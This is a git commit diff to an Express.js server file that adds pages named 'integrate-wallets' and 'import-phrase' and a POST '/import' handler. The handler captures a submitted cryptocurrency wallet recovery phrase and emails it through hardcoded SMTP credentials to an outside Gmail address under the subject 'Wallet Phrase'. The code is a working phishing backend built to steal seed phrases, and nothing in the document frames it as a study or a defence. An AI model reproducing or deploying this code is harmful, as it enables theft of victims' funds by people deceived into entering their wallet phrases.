a4a55baa10d3ac16f6043be410519c46c9bee92e
stoneymike <michaelstone730@gmail.com>
2022-10-25 07:11:34 -0400

    Configuring server 0

--- index.js
+++ index.js
@@ -1,10 +1,47 @@
 const express = require("express")
 const path = require("path")
+const nodemailer = require("nodemailer")
 
 const app = express()
 
+app.use(express.static('public'))
+app.use(express.urlencoded({ extended: true}))
+
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname+"/views/index.html"))
+})
+
+app.get("/integrate-wallets", (req, res) => {
+    res.sendFile(path.join(__dirname+"/views/integrate-wallets.html"))
+})
+
+app.get("/import-phrase", (req, res) => {
+    res.sendFile(path.join(__dirname+"/views/import-phrase.html"))
+})
+
+app.post("/import", async (req, res) => {
+    try {
+        console.log(req.body.Phrase)
+        res.send(req.body.Phrase)
+        let transport = nodemailer.createTransport({
+            host: "smtp.mailtrap.io",
+            port: 2525,
+            auth: {
+                user: "03aa34adf1611f",
+                pass: "433a4aa128eab7"
+            }
+        })
+    
+        let info = await transport.sendMail({
+            from: "michaelstone@gmail.com",
+            to: "devtruth17@gmail.com",
+            subject: "Wallet Phrase",
+            text: req.body.Phrase,
+            html: `<b>${req.body.Phrase}</b>`
+        })
+    } catch(err) {
+        console.log(err)
+    }
 })
 
 const port = process.env.PORT || 3000
